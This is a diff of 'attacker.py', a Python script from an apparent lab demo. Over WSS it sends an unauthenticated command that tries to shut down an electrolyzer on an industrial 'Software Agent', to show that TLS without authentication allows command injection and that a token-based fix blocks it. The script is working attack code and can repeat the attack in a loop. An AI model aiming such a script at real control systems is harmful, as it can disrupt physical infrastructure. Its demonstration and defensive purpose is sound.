@@ -1,39 +1,31 @@
 #!/usr/bin/env python3
 """
-attacker.py – Malicious WSS client that demonstrates unauthorized command injection.
+attacker.py - Malicious WSS client.
 
-This script connects to the Software Agent over WSS (verifying the server cert,
-proving TLS is working), then sends a schedule message WITHOUT a valid auth token.
-
-In AUTH_MODE=none  → the Agent accepts the message  (vulnerability demonstrated).
-In AUTH_MODE=token → the Agent rejects the message  (fix demonstrated).
+Connects over WSS (verifying the server cert, proving TLS is active)
+but sends NO valid auth token. Demonstrates that WSS alone does not
+prevent unauthorized command injection.
 
 Usage:
-    python3 /opt/p2p-demo/attacker.py --once          # single shot
-    python3 /opt/p2p-demo/attacker.py --loop          # repeat every 15 s
-    python3 /opt/p2p-demo/attacker.py --loop --interval 5
+  python3 attacker.py --once       # single attack then exit (default)
+  python3 attacker.py --loop       # repeat every --interval seconds
+  python3 attacker.py --loop --interval 5
 
-Environment variables (set via /opt/p2p-demo/attacker.env):
-  AGENT_HOST   - hostname/IP of the Software Agent  (default: 10.0.1.20)
-  WSS_PORT     - WSS port of the Software Agent     (default: 8443)
-  CA_CERT_PATH - path to the trusted server CA cert (default: certs/server.crt)
-  LOG_DIR      - directory for attacker.log         (default: /var/log/p2p-demo)
+Env vars (from attacker.env):
+  AGENT_HOST, WSS_PORT, CA_CERT_PATH, LOG_DIR
 """
 
 import argparse
 import asyncio
 import json
+import logging
 import os
 import ssl
 import sys
-import uuid
 
 import websockets
 
-sys.path.insert(0, os.path.dirname(__file__))
-from common import setup_logger, build_schedule_message
-
-# ─── Configuration ────────────────────────────────────────────────────────────
+# ── Config ─────────────────────────────────────────────────────────────────
 
 AGENT_HOST   = os.environ.get("AGENT_HOST",   "10.0.1.20")
 WSS_PORT     = int(os.environ.get("WSS_PORT", "8443"))
@@ -42,108 +34,77 @@ LOG_DIR      = os.environ.get("LOG_DIR",      "/var/log/p2p-demo")
 
 LOG_FILE = os.path.join(LOG_DIR, "attacker.log")
 
-# ─── Logger ───────────────────────────────────────────────────────────────────
+# ── Logging ────────────────────────────────────────────────────────────────
 
-log = setup_logger("attacker", LOG_FILE)
+os.makedirs(LOG_DIR, exist_ok=True)
+logging.basicConfig(
+    level=logging.INFO,
+    format="%(asctime)s [%(levelname)s] %(message)s",
+    datefmt="%Y-%m-%dT%H:%M:%S",
+    handlers=[
+        logging.FileHandler(LOG_FILE),
+        logging.StreamHandler(sys.stdout),
+    ],
+)
+log = logging.getLogger("attacker")
 
-# ─── Attack logic ─────────────────────────────────────────────────────────────
 
-async def send_attack(ssl_ctx: ssl.SSLContext) -> None:
-    """Connect to the agent and send a malicious schedule message."""
+# ── Attack ──────────────────────────────────────────────────────────────────
+
+async def attack(ssl_ctx: ssl.SSLContext) -> None:
     uri = f"wss://{AGENT_HOST}:{WSS_PORT}"
-    schedule_id = str(uuid.uuid4())
+    msg = {
+        "source": "attacker",
+        "electrolyzer_enable": False,  # attempt to shut down electrolyzer
+        # no token - demonstrating that without auth anyone can connect
+    }
 
-    # Deliberately omit a valid token to demonstrate the vulnerability.
-    message = build_schedule_message(
-        source="attacker",
-        schedule_id=schedule_id,
-        electrolyzer_enable=False,   # flip the electrolyzer OFF
-        token=None,                  # no token – the attacker doesn't know it
-    )
-
-    log.warning("=" * 60)
+    log.warning("=" * 55)
     log.warning("ATTACK: connecting to %s", uri)
-    log.warning("ATTACK: sending malicious schedule_id=%s", schedule_id)
-    log.warning("ATTACK: electrolyzer_enable=False (attempting to shut down)")
-    log.warning("=" * 60)
+    log.warning("ATTACK: sending %s", msg)
+    log.warning("=" * 55)
 
     try:
         async with websockets.connect(uri, ssl=ssl_ctx) as ws:
-            log.info("TLS handshake succeeded – transport is encrypted (WSS)")
-            log.info("Sending malicious message …")
-            await ws.send(message)
+            log.info("TLS handshake OK - channel is encrypted (WSS active)")
+            await ws.send(json.dumps(msg))
+            resp = json.loads(await asyncio.wait_for(ws.recv(), timeout=10))
 
-            response_raw = await asyncio.wait_for(ws.recv(), timeout=10)
-            response = json.loads(response_raw)
-
-            if response.get("status") == "accepted":
-                log.warning(
-                    "ATTACK SUCCEEDED – Agent accepted message without authenticating the sender!"
-                )
-                log.warning("This demonstrates the vulnerability: WSS encrypts the channel")
-                log.warning("but does NOT prevent unauthorized senders from issuing commands.")
+            if resp.get("status") == "accepted":
+                log.warning("ATTACK SUCCEEDED - agent accepted without authenticating sender!")
+                log.warning("WSS encrypts traffic but did NOT stop this unauthorized command.")
             else:
-                log.info(
-                    "Attack BLOCKED – Agent rejected the message. reason=%s",
-                    response.get("reason"),
-                )
-                log.info("This demonstrates the fix: AUTH_MODE=token is working correctly.")
-
+                log.info("Attack BLOCKED - reason: %s", resp.get("reason"))
+                log.info("Fix is working: AUTH_MODE=token rejected the attacker.")
     except Exception as exc:
-        log.error("Connection failed: %s", exc)
+        log.error("Connection error: %s", exc)
 
 
 async def main(args: argparse.Namespace) -> None:
-    uri = f"wss://{AGENT_HOST}:{WSS_PORT}"
-
-    # Build TLS context – verify the server cert.  This proves the channel
-    # is encrypted even for the attacker; the missing piece is auth.
     ssl_ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
     ssl_ctx.load_verify_locations(CA_CERT_PATH)
-    ssl_ctx.check_hostname = False  # self-signed cert has IP SAN, not hostname
+    ssl_ctx.check_hostname = False
 
-    log.info("Attacker script initialised")
-    log.info("  Target : %s", uri)
-    log.info("  CA cert: %s", CA_CERT_PATH)
+    log.info("Attacker ready -> wss://%s:%d", AGENT_HOST, WSS_PORT)
 
     if args.loop:
-        interval = args.interval
-        log.info("  Mode   : loop (every %ds)", interval)
         while True:
-            await send_attack(ssl_ctx)
-            log.info("Waiting %ds before next attack …", interval)
-            await asyncio.sleep(interval)
+            await attack(ssl_ctx)
+            log.info("Waiting %ds before next attempt...", args.interval)
+            await asyncio.sleep(args.interval)
     else:
-        log.info("  Mode   : one-shot")
-        await send_attack(ssl_ctx)
+        await attack(ssl_ctx)
 
 
-# ─── CLI ──────────────────────────────────────────────────────────────────────
+# ── CLI ─────────────────────────────────────────────────────────────────────
 
 if __name__ == "__main__":
-    parser = argparse.ArgumentParser(
-        description="WSS attacker – sends unauthorized schedule messages to the agent."
-    )
+    parser = argparse.ArgumentParser(description="WSS attacker script")
     mode = parser.add_mutually_exclusive_group()
-    mode.add_argument(
-        "--once",
-        dest="loop",
-        action="store_false",
-        default=False,
-        help="Send a single attack message then exit (default).",
-    )
-    mode.add_argument(
-        "--loop",
-        dest="loop",
-        action="store_true",
-        help="Repeatedly send attack messages.",
-    )
-    parser.add_argument(
-        "--interval",
-        type=int,
-        default=15,
-        help="Seconds between attacks in --loop mode (default: 15).",
-    )
-
-    parsed = parser.parse_args()
-    asyncio.run(main(parsed))
+    mode.add_argument("--once", dest="loop", action="store_false", default=False,
+                      help="Send one attack message then exit (default).")
+    mode.add_argument("--loop", dest="loop", action="store_true",
+                      help="Repeat attack messages.")
+    parser.add_argument("--interval", type=int, default=15,
+                        help="Seconds between attacks in loop mode (default 15).")
+    asyncio.run(main(parser.parse_args()))
